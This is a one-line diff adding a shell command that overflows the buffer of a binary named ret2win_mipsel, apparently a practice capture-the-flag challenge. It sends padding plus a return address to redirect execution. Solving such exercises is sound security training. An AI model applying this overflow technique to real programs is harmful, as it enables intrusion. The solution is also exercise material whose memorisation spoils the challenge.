@@ -1,0 +1,1 @@
+echo -n -e 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00\x0a\x40\x00' | ./ret2win_mipsel
